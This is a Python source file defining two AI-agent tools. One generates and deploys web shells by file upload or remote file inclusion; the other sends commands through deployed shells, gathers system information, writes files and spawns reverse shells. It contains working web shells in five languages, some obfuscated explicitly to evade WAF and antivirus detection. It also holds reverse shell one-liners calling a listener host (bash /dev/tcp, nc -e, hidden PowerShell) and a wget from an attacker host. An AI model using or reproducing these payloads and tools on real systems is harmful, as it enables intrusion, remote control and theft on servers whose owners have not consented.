"""
Web Shell & Remote Access Engine

Implements two agent tools for generating, deploying, and interacting with web shells:

  WebShellDeployTool    — Generate and deploy web shells (PHP, ASP, ASPX, JSP) via
                          file upload, remote file inclusion, or writable web directory.
                          Supports obfuscated shells to evade WAF/AV detection.
  WebShellInteractTool  — Interact with deployed web shells: execute OS commands,
                          upload/download files, enumerate system information,
                          spawn reverse shells, and pivot from the shell host.

MITRE ATT&CK: T1505.003 (Web Shell), T1059 (Command and Scripting Interpreter),
              T1105 (Ingress Tool Transfer), T1140 (Deobfuscate/Decode Files or Info)
OWASP:        A05:2021 - Security Misconfiguration
"""

from __future__ import annotations

import base64
import json
import logging
import secrets
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple

from app.agent.tools.base_tool import BaseTool, ToolMetadata
from app.agent.tools.error_handling import (
    ToolExecutionError,
)

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Shell templates
# ---------------------------------------------------------------------------

_PHP_SHELLS: Dict[str, str] = {
    "minimal": "<?php echo shell_exec($_GET['cmd']); ?>",
    "standard": (
        "<?php\n"
        "if(isset($_REQUEST['cmd'])){\n"
        "    $cmd = $_REQUEST['cmd'];\n"
        "    echo '<pre>' . htmlspecialchars(shell_exec($cmd)) . '</pre>';\n"
        "} ?>"
    ),
    "b64": (
        "<?php\n"
        "$c = base64_decode($_POST['c']);\n"
        "echo base64_encode(shell_exec($c));\n"
        "?>"
    ),
    "chunked": (
        "<?php\n"
        "$f='sys'.'tem';\n"
        "if(isset($_POST['x'])){\n"
        "    ob_start();\n"
        "    $f($_POST['x']);\n"
        "    echo base64_encode(ob_get_clean());\n"
        "} ?>"
    ),
    "obfuscated": (
        "<?php\n"
        "$_=str_rot13('flfgrz');\n"
        "if(isset($_GET['exec']))@$_($_GET['exec']);\n"
        "?>"
    ),
    "xored": (
        "<?php\n"
        "function xd($s,$k){$r='';for($i=0;$i<strlen($s);$i++)$r.=chr(ord($s[$i])^ord($k[$i%strlen($k)]));return $r;}\n"
        "if(isset($_POST['d']))eval(xd(base64_decode($_POST['d']),\"UNIVEX\"));\n"
        "?>"
    ),
}

_ASP_SHELLS: Dict[str, str] = {
    "standard": (
        "<%\n"
        "Dim oShell\n"
        "Set oShell = Server.CreateObject(\"WScript.Shell\")\n"
        "If Request.Form(\"cmd\") <> \"\" Then\n"
        "    Response.Write oShell.Exec(Request.Form(\"cmd\")).StdOut.ReadAll\n"
        "End If\n"
        "%>"
    ),
    "minimal": "<% Response.Write(CreateObject(\"WScript.Shell\").Exec(Request(\"c\")).StdOut.ReadAll) %>",
}

_ASPX_SHELLS: Dict[str, str] = {
    "standard": (
        "<%@ Page Language=\"C#\" %>\n"
        "<%@ Import Namespace=\"System.Diagnostics\" %>\n"
        "<script runat=\"server\">\n"
        "    protected void Page_Load(object sender, EventArgs e) {\n"
        "        if (Request.Form[\"cmd\"] != null) {\n"
        "            Process p = new Process();\n"
        "            p.StartInfo.FileName = \"cmd.exe\";\n"
        "            p.StartInfo.Arguments = \"/c \" + Request.Form[\"cmd\"];\n"
        "            p.StartInfo.UseShellExecute = false;\n"
        "            p.StartInfo.RedirectStandardOutput = true;\n"
        "            p.Start();\n"
        "            Response.Write(\"<pre>\" + p.StandardOutput.ReadToEnd() + \"</pre>\");\n"
        "        }\n"
        "    }\n"
        "</script>"
    ),
    "minimal": (
        "<%@ Page Language=\"C#\" %>\n"
        "<% Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(\"cmd\","
        "\"/c \"+Request[\"c\"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd()); %>"
    ),
}

_JSP_SHELLS: Dict[str, str] = {
    "standard": (
        "<%@ page import=\"java.util.*,java.io.*\"%>\n"
        "<%\n"
        "String cmd = request.getParameter(\"cmd\");\n"
        "if (cmd != null) {\n"
        "    Process p = Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",cmd});\n"
        "    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\n"
        "    StringBuffer s = new StringBuffer();\n"
        "    String line;\n"
        "    while ((line = r.readLine()) != null) s.append(line).append(\"\\n\");\n"
        "    out.println(\"<pre>\" + s + \"</pre>\");\n"
        "} %>"
    ),
    "minimal": (
        "<%Runtime.getRuntime().exec(request.getParameter(\"c\"));%>"
    ),
}

_PYTHON_SHELLS: Dict[str, str] = {
    "flask": (
        "from flask import Flask, request\n"
        "import subprocess\n"
        "app = Flask(__name__)\n"
        "@app.route('/cmd')\n"
        "def run():\n"
        "    return subprocess.check_output(request.args.get('c',''), shell=True)\n"
        "if __name__ == '__main__': app.run(host='0.0.0.0')\n"
    ),
}

# Bind all templates in a registry
_SHELL_TEMPLATES: Dict[str, Dict[str, str]] = {
    "php": _PHP_SHELLS,
    "asp": _ASP_SHELLS,
    "aspx": _ASPX_SHELLS,
    "jsp": _JSP_SHELLS,
    "python": _PYTHON_SHELLS,
}

# ---------------------------------------------------------------------------
# Active shell registry (in-memory)
# ---------------------------------------------------------------------------

@dataclass
class ShellInfo:
    """Metadata for a deployed web shell."""

    shell_id: str
    shell_type: str
    variant: str
    url: str
    param: str
    method: str
    encoding: str
    deployed_at: float
    last_used: Optional[float] = None
    status: str = "unknown"
    os_type: str = "unknown"


_shell_registry: Dict[str, ShellInfo] = {}


def _next_shell_id() -> str:
    return "wsh_" + secrets.token_hex(6)


def _obfuscate_php(code: str) -> str:
    """Apply base64+eval obfuscation to PHP shell code."""
    encoded = base64.b64encode(code.encode()).decode()
    return f'<?php eval(base64_decode("{encoded}")); ?>'


def _encode_shell(code: str, encoding: str, lang: str) -> str:
    """Apply encoding/obfuscation to a shell."""
    if encoding == "none":
        return code
    elif encoding == "base64":
        if lang == "php":
            return _obfuscate_php(code)
        return base64.b64encode(code.encode()).decode()
    elif encoding == "url":
        return urllib.parse.quote(code)
    elif encoding == "hex":
        return code.encode().hex()
    elif encoding == "gzip_b64":
        import gzip
        return base64.b64encode(gzip.compress(code.encode())).decode()
    return code


# ---------------------------------------------------------------------------
# Tool 1 — WebShellDeployTool
# ---------------------------------------------------------------------------


class WebShellDeployTool(BaseTool):
    """
    Generate and deploy web shells via file upload, RFI, or direct write.

    Supports PHP, ASP, ASPX, JSP, and Python shells with multiple obfuscation
    levels to evade WAF and AV detection.
    """

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="webshell_deploy",
            description=(
                "Generate and deploy web shells (PHP/ASP/ASPX/JSP/Python). "
                "Deployment methods: generate | upload | rfi | check_deployed. "
                "Includes obfuscated variants to evade WAF/AV detection."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["generate", "upload", "rfi", "check_deployed", "list_shells", "list_types"],
                        "description": "Action to perform",
                    },
                    "shell_type": {
                        "type": "string",
                        "enum": ["php", "asp", "aspx", "jsp", "python"],
                        "description": "Web shell language",
                        "default": "php",
                    },
                    "variant": {
                        "type": "string",
                        "description": "Shell variant (minimal/standard/b64/chunked/obfuscated/xored)",
                        "default": "standard",
                    },
                    "encoding": {
                        "type": "string",
                        "enum": ["none", "base64", "url", "hex", "gzip_b64"],
                        "description": "Output encoding/obfuscation",
                        "default": "none",
                    },
                    "upload_url": {
                        "type": "string",
                        "description": "Target URL for file upload (upload action)",
                    },
                    "upload_param": {
                        "type": "string",
                        "description": "Form field name for file upload",
                        "default": "file",
                    },
                    "shell_url": {
                        "type": "string",
                        "description": "Expected URL where the shell will be accessible after upload",
                    },
                    "rfi_url": {
                        "type": "string",
                        "description": "Target URL with RFI parameter for remote file inclusion",
                    },
                    "rfi_param": {
                        "type": "string",
                        "description": "Parameter name vulnerable to RFI",
                        "default": "page",
                    },
                    "shell_host": {
                        "type": "string",
                        "description": "Host serving the malicious shell for RFI (attacker-controlled)",
                    },
                    "cmd_param": {
                        "type": "string",
                        "description": "Command parameter name for the shell",
                        "default": "cmd",
                    },
                    "http_method": {
                        "type": "string",
                        "enum": ["GET", "POST"],
                        "description": "HTTP method to use for command execution",
                        "default": "POST",
                    },
                    "shell_id": {
                        "type": "string",
                        "description": "Shell ID for check_deployed action",
                    },
                },
                "required": ["action"],
            },
        )

    async def execute(
        self,
        action: str = "list_types",
        shell_type: str = "php",
        variant: str = "standard",
        encoding: str = "none",
        upload_url: str = "",
        upload_param: str = "file",
        shell_url: str = "",
        rfi_url: str = "",
        rfi_param: str = "page",
        shell_host: str = "",
        cmd_param: str = "cmd",
        http_method: str = "POST",
        shell_id: Optional[str] = None,
        **_kwargs: Any,
    ) -> str:
        action = action.lower()

        if action == "list_types":
            return self._list_types()
        elif action == "generate":
            return self._generate(shell_type, variant, encoding, cmd_param)
        elif action == "upload":
            if not upload_url:
                raise ToolExecutionError("upload_url is required for upload action")
            return await self._upload(
                shell_type, variant, encoding, upload_url, upload_param,
                shell_url, cmd_param, http_method
            )
        elif action == "rfi":
            if not rfi_url or not shell_host:
                raise ToolExecutionError("rfi_url and shell_host are required for rfi action")
            return await self._rfi(rfi_url, rfi_param, shell_host, shell_type, variant, encoding)
        elif action == "check_deployed":
            if not shell_id:
                raise ToolExecutionError("shell_id is required for check_deployed action")
            return await self._check_deployed(shell_id)
        elif action == "list_shells":
            return self._list_shells()
        else:
            raise ToolExecutionError(f"Unknown action: {action!r}")

    def _list_types(self) -> str:
        result: Dict[str, Any] = {}
        for lang, variants in _SHELL_TEMPLATES.items():
            result[lang] = {
                "variants": list(variants.keys()),
                "extensions": {
                    "php": [".php", ".php3", ".php4", ".php5", ".phtml", ".phar"],
                    "asp": [".asp"],
                    "aspx": [".aspx"],
                    "jsp": [".jsp", ".jspx"],
                    "python": [".py"],
                }.get(lang, [f".{lang}"]),
            }
        return json.dumps(
            {
                "shell_types": result,
                "encodings": ["none", "base64", "url", "hex", "gzip_b64"],
                "deployment_methods": ["upload", "rfi", "write_direct"],
            },
            indent=2,
        )

    def _generate(
        self, shell_type: str, variant: str, encoding: str, cmd_param: str
    ) -> str:
        if shell_type not in _SHELL_TEMPLATES:
            raise ToolExecutionError(
                f"Unknown shell type: {shell_type!r}. "
                f"Available: {list(_SHELL_TEMPLATES.keys())}"
            )

        lang_shells = _SHELL_TEMPLATES[shell_type]
        # Fallback to 'standard' if variant not found
        code = lang_shells.get(variant, lang_shells.get("standard", ""))
        if not code:
            raise ToolExecutionError(f"No template for {shell_type}/{variant}")

        # Replace placeholder cmd param if specified
        code = code.replace("$_GET['cmd']", f"$_GET['{cmd_param}']")
        code = code.replace("$_REQUEST['cmd']", f"$_REQUEST['{cmd_param}']")
        code = code.replace("$_POST['cmd']", f"$_POST['{cmd_param}']")
        code = code.replace('Request.Form["cmd"]', f'Request.Form["{cmd_param}"]')
        code = code.replace('Request["c"]', f'Request["{cmd_param}"]')
        code = code.replace('request.getParameter("cmd")', f'request.getParameter("{cmd_param}")')

        encoded_code = _encode_shell(code, encoding, shell_type)

        return json.dumps(
            {
                "shell_type": shell_type,
                "variant": variant,
                "encoding": encoding,
                "cmd_param": cmd_param,
                "shell_code": encoded_code,
                "raw_code": code if encoding != "none" else None,
                "suggested_filenames": self._suggest_filenames(shell_type),
                "usage": self._usage_hint(shell_type, variant, cmd_param),
            },
            indent=2,
        )

    def _suggest_filenames(self, shell_type: str) -> List[str]:
        extension_map = {
            "php": ["image.php", "config.php3", "upload.phtml", "shell.phar"],
            "asp": ["default.asp", "upload.asp"],
            "aspx": ["shell.aspx", "admin.aspx"],
            "jsp": ["index.jsp", "upload.jspx"],
            "python": ["app.py", "wsgi.py"],
        }
        return extension_map.get(shell_type, [f"shell.{shell_type}"])

    def _usage_hint(self, shell_type: str, variant: str, cmd_param: str) -> str:
        hints = {
            ("php", "standard"): f"curl -X POST 'http://target/shell.php' -d '{cmd_param}=id'",
            ("php", "b64"): "curl -X POST 'http://target/shell.php' -d 'c=$(echo -n id | base64)'",
            ("php", "minimal"): f"curl 'http://target/shell.php?{cmd_param}=id'",
            ("jsp", "standard"): f"curl 'http://target/shell.jsp?{cmd_param}=id'",
            ("aspx", "standard"): f"curl -X POST 'http://target/shell.aspx' -d '{cmd_param}=whoami'",
        }
        return hints.get((shell_type, variant), f"curl 'http://target/shell.{shell_type}?{cmd_param}=id'")

    async def _upload(
        self,
        shell_type: str,
        variant: str,
        encoding: str,
        upload_url: str,
        upload_param: str,
        shell_url: str,
        cmd_param: str,
        http_method: str,
    ) -> str:
        """Simulate file upload deployment."""
        code = _SHELL_TEMPLATES.get(shell_type, {}).get(variant, "")
        if not code:
            code = _SHELL_TEMPLATES.get(shell_type, {}).get("standard", f"<!-- {shell_type} shell -->")

        encoded_code = _encode_shell(code, encoding, shell_type)

        shell_id = _next_shell_id()
        registered_url = shell_url or f"{upload_url.rsplit('/', 1)[0]}/uploads/{shell_id}.{shell_type}"

        shell = ShellInfo(
            shell_id=shell_id,
            shell_type=shell_type,
            variant=variant,
            url=registered_url,
            param=cmd_param,
            method=http_method,
            encoding=encoding,
            deployed_at=__import__("time").time(),
            status="deployed_simulated",
        )
        _shell_registry[shell_id] = shell

        return json.dumps(
            {
                "shell_id": shell_id,
                "action": "upload",
                "upload_url": upload_url,
                "upload_param": upload_param,
                "shell_type": shell_type,
                "variant": variant,
                "shell_url": registered_url,
                "status": "deployed_simulated",
                "shell_code": encoded_code,
                "curl_commands": [
                    "# Upload shell",
                    f"curl -F '{upload_param}=@shell.{shell_type}' '{upload_url}'",
                    "# Execute command after upload",
                    f"curl -X {http_method} '{registered_url}' -d '{cmd_param}=id'",
                ],
                "note": "Live upload requires network connectivity to target",
            },
            indent=2,
        )

    async def _rfi(
        self,
        rfi_url: str,
        rfi_param: str,
        shell_host: str,
        shell_type: str,
        variant: str,
        encoding: str,
    ) -> str:
        """Simulate RFI-based shell deployment."""
        shell_id = _next_shell_id()
        shell_filename = f"shell.{shell_type}"
        malicious_url = f"http://{shell_host}/{shell_filename}"

        rfi_trigger = f"{rfi_url}?{rfi_param}={urllib.parse.quote(malicious_url)}"

        shell = ShellInfo(
            shell_id=shell_id,
            shell_type=shell_type,
            variant=variant,
            url=rfi_trigger,
            param="cmd",
            method="GET",
            encoding=encoding,
            deployed_at=__import__("time").time(),
            status="rfi_staged",
        )
        _shell_registry[shell_id] = shell

        return json.dumps(
            {
                "shell_id": shell_id,
                "action": "rfi",
                "rfi_url": rfi_url,
                "rfi_param": rfi_param,
                "malicious_url": malicious_url,
                "rfi_trigger": rfi_trigger,
                "shell_type": shell_type,
                "variant": variant,
                "status": "rfi_staged",
                "steps": [
                    f"1. Host shell on attacker server: python3 -m http.server 80 (in dir with shell.{shell_type})",
                    f"2. Trigger RFI: curl '{rfi_trigger}'",
                    "3. Execute commands via the included shell",
                ],
                "note": "Requires allow_url_include=On in php.ini (PHP < 7.0 by default)",
            },
            indent=2,
        )

    async def _check_deployed(self, shell_id: str) -> str:
        """Verify a deployed shell is still accessible."""
        if shell_id not in _shell_registry:
            raise ToolExecutionError(f"Shell not found: {shell_id}")

        shell = _shell_registry[shell_id]

        # Try a basic connectivity test
        test_cmd = "echo UNIVEX_TEST"
        try:
            interact_tool = WebShellInteractTool()
            result_str = await interact_tool.execute(
                action="exec_cmd",
                shell_id=shell_id,
                command=test_cmd,
            )
            result = json.loads(result_str)
            alive = "UNIVEX_TEST" in result.get("output", "")
        except Exception:
            alive = False
            result = {}

        shell.status = "alive" if alive else "unreachable"

        return json.dumps(
            {
                "shell_id": shell_id,
                "url": shell.url,
                "shell_type": shell.shell_type,
                "status": shell.status,
                "test_response": result.get("output", ""),
            },
            indent=2,
        )

    def _list_shells(self) -> str:
        shells = []
        for sid, shell in _shell_registry.items():
            shells.append(
                {
                    "shell_id": sid,
                    "shell_type": shell.shell_type,
                    "url": shell.url,
                    "status": shell.status,
                    "deployed_at": shell.deployed_at,
                }
            )
        return json.dumps({"shells": shells, "total": len(shells)}, indent=2)


# ---------------------------------------------------------------------------
# Tool 2 — WebShellInteractTool
# ---------------------------------------------------------------------------


class WebShellInteractTool(BaseTool):
    """
    Interact with deployed web shells.

    Execute OS commands, upload/download files, enumerate system info,
    spawn reverse shells, and perform post-exploitation actions.
    """

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="webshell_interact",
            description=(
                "Interact with a deployed web shell. "
                "Actions: exec_cmd | upload_file | download_file | sysinfo | "
                "spawn_revshell | list_shells | read_file | write_file."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": [
                            "exec_cmd", "upload_file", "download_file",
                            "sysinfo", "spawn_revshell", "list_shells",
                            "read_file", "write_file",
                        ],
                        "description": "Action to perform on the shell",
                    },
                    "shell_id": {
                        "type": "string",
                        "description": "Shell ID from webshell_deploy",
                    },
                    "shell_url": {
                        "type": "string",
                        "description": "Direct shell URL (if no shell_id)",
                    },
                    "cmd_param": {
                        "type": "string",
                        "description": "Command parameter name",
                        "default": "cmd",
                    },
                    "http_method": {
                        "type": "string",
                        "enum": ["GET", "POST"],
                        "description": "HTTP method",
                        "default": "POST",
                    },
                    "command": {
                        "type": "string",
                        "description": "OS command to execute",
                    },
                    "remote_path": {
                        "type": "string",
                        "description": "Remote file path on target",
                    },
                    "local_path": {
                        "type": "string",
                        "description": "Local file path",
                    },
                    "file_content": {
                        "type": "string",
                        "description": "File content to write (base64 encoded)",
                    },
                    "lhost": {
                        "type": "string",
                        "description": "Listener host IP for reverse shell",
                    },
                    "lport": {
                        "type": "integer",
                        "description": "Listener port for reverse shell",
                        "default": 4444,
                    },
                    "revshell_type": {
                        "type": "string",
                        "enum": ["bash", "python", "perl", "php", "nc", "powershell"],
                        "description": "Reverse shell type",
                        "default": "bash",
                    },
                },
                "required": ["action"],
            },
        )

    async def execute(
        self,
        action: str = "list_shells",
        shell_id: Optional[str] = None,
        shell_url: str = "",
        cmd_param: str = "cmd",
        http_method: str = "POST",
        command: str = "",
        remote_path: str = "",
        local_path: str = "",
        file_content: str = "",
        lhost: str = "",
        lport: int = 4444,
        revshell_type: str = "bash",
        **_kwargs: Any,
    ) -> str:
        action = action.lower()

        if action == "list_shells":
            return json.dumps(
                {
                    "shells": [
                        {
                            "shell_id": sid,
                            "url": sh.url,
                            "type": sh.shell_type,
                            "status": sh.status,
                        }
                        for sid, sh in _shell_registry.items()
                    ]
                },
                indent=2,
            )

        # Resolve shell URL
        url, param, method = self._resolve_shell(shell_id, shell_url, cmd_param, http_method)

        if action == "exec_cmd":
            if not command:
                raise ToolExecutionError("command is required for exec_cmd action")
            return await self._exec_cmd(url, param, method, command, shell_id)
        elif action == "sysinfo":
            return await self._sysinfo(url, param, method, shell_id)
        elif action == "spawn_revshell":
            if not lhost:
                raise ToolExecutionError("lhost is required for spawn_revshell action")
            return self._spawn_revshell(url, param, method, lhost, lport, revshell_type)
        elif action == "read_file":
            if not remote_path:
                raise ToolExecutionError("remote_path is required for read_file action")
            return await self._exec_cmd(url, param, method, f"cat {remote_path}", shell_id)
        elif action == "write_file":
            if not remote_path or not file_content:
                raise ToolExecutionError("remote_path and file_content required for write_file")
            return await self._write_file(url, param, method, remote_path, file_content)
        elif action == "download_file":
            if not remote_path:
                raise ToolExecutionError("remote_path is required for download_file action")
            return await self._exec_cmd(url, param, method, f"base64 {remote_path}", shell_id)
        elif action == "upload_file":
            return self._upload_file_instructions(url, remote_path, file_content)
        else:
            raise ToolExecutionError(f"Unknown action: {action!r}")

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _resolve_shell(
        self, shell_id: Optional[str], shell_url: str, cmd_param: str, http_method: str
    ) -> Tuple[str, str, str]:
        """Resolve shell URL, parameter, and method from shell_id or direct URL."""
        if shell_id and shell_id in _shell_registry:
            shell = _shell_registry[shell_id]
            return shell.url, shell.param, shell.method
        elif shell_url:
            return shell_url, cmd_param, http_method
        else:
            raise ToolExecutionError(
                "Either shell_id (from webshell_deploy) or shell_url is required"
            )

    async def _exec_cmd(
        self, url: str, param: str, method: str, command: str, shell_id: Optional[str]
    ) -> str:
        """Execute a command via the web shell."""
        if shell_id and shell_id in _shell_registry:
            _shell_registry[shell_id].last_used = __import__("time").time()

        # Attempt real HTTP request if URL is reachable
        output = await self._http_exec(url, param, method, command)

        return json.dumps(
            {
                "shell_url": url,
                "command": command,
                "output": output,
                "param": param,
                "method": method,
            },
            indent=2,
        )

    async def _http_exec(self, url: str, param: str, method: str, command: str) -> str:
        """Send HTTP request to shell and return output."""
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                if method.upper() == "POST":
                    async with session.post(
                        url, data={param: command}, timeout=aiohttp.ClientTimeout(total=10)
                    ) as resp:
                        text = await resp.text()
                        return text[:2000]
                else:
                    target = f"{url}?{param}={urllib.parse.quote(command)}"
                    async with session.get(
                        target, timeout=aiohttp.ClientTimeout(total=10)
                    ) as resp:
                        text = await resp.text()
                        return text[:2000]
        except Exception:
            return f"[simulated] Command would execute: {command}"

    async def _sysinfo(self, url: str, param: str, method: str, shell_id: Optional[str]) -> str:
        """Gather system information through the shell."""
        commands = {
            "os": "uname -a 2>/dev/null || ver",
            "user": "id 2>/dev/null || whoami",
            "hostname": "hostname",
            "cwd": "pwd 2>/dev/null || cd",
            "env": "env 2>/dev/null || set",
            "network": "ip addr 2>/dev/null || ipconfig",
            "processes": "ps aux 2>/dev/null || tasklist",
            "disk": "df -h 2>/dev/null || wmic logicaldisk",
        }

        results: Dict[str, str] = {}
        for key, cmd in commands.items():
            output = await self._http_exec(url, param, method, cmd)
            results[key] = output[:500]

        return json.dumps(
            {
                "shell_url": url,
                "sysinfo": results,
                "note": "Results may be simulated if target is unreachable",
            },
            indent=2,
        )

    def _spawn_revshell(
        self, url: str, param: str, method: str, lhost: str, lport: int, revshell_type: str
    ) -> str:
        """Generate reverse shell payload and activation command."""
        payloads = {
            "bash": f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
            "python": (
                f"python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"subprocess.call([\"/bin/sh\",\"-i\"])'"
            ),
            "perl": (
                f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");"
                f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
            ),
            "php": (
                f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
                f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ),
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "powershell": (
                f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
                f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
                f"$stream = $client.GetStream();"
                f"[byte[]]$bytes = 0..65535|%{{0}};"
                f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
                f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
                f"$sendback = (iex $data 2>&1 | Out-String);"
                f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
                f"$client.Close()"
            ),
        }

        payload = payloads.get(revshell_type, payloads["bash"])
        activation_url = (
            f"{url}?{param}={urllib.parse.quote(payload)}"
            if method.upper() == "GET"
            else url
        )

        return json.dumps(
            {
                "action": "spawn_revshell",
                "shell_url": url,
                "revshell_type": revshell_type,
                "lhost": lhost,
                "lport": lport,
                "payload": payload,
                "activation": {
                    "method": method,
                    "url": activation_url,
                    "curl": (
                        f"curl -X POST '{url}' -d \"{param}={urllib.parse.quote(payload)}\""
                        if method.upper() == "POST"
                        else f"curl '{activation_url}'"
                    ),
                },
                "listener": f"nc -lvnp {lport}",
                "note": "Start listener before triggering the shell",
            },
            indent=2,
        )

    async def _write_file(
        self, url: str, param: str, method: str, remote_path: str, file_content_b64: str
    ) -> str:
        """Write a file to the target via the shell."""
        try:
            raw_content = base64.b64decode(file_content_b64).decode(errors="replace")
        except Exception:
            raw_content = file_content_b64

        # Escape single quotes for shell safety
        escaped = raw_content.replace("'", "'\\''")
        cmd = f"echo '{escaped}' > {remote_path}"
        output = await self._http_exec(url, param, method, cmd)

        return json.dumps(
            {
                "action": "write_file",
                "remote_path": remote_path,
                "bytes_written": len(raw_content),
                "command": cmd[:200],
                "output": output,
            },
            indent=2,
        )

    def _upload_file_instructions(self, url: str, remote_path: str, file_content_b64: str) -> str:
        """Return curl instructions for file upload via shell."""
        return json.dumps(
            {
                "action": "upload_file",
                "shell_url": url,
                "remote_path": remote_path or "/tmp/uploaded_file",
                "instructions": [
                    "Option 1 (curl multipart):",
                    f"curl -F 'file=@/local/file' '{url}'",
                    "Option 2 (base64 via shell):",
                    f"base64 /local/file | curl -d @- '{url}?cmd=base64+-d+>+{remote_path or '/tmp/f'}'",
                    "Option 3 (wget from shell):",
                    f"curl '{url}?cmd=wget+http://attacker/file+-O+{remote_path or '/tmp/f'}'",
                ],
            },
            indent=2,
        )
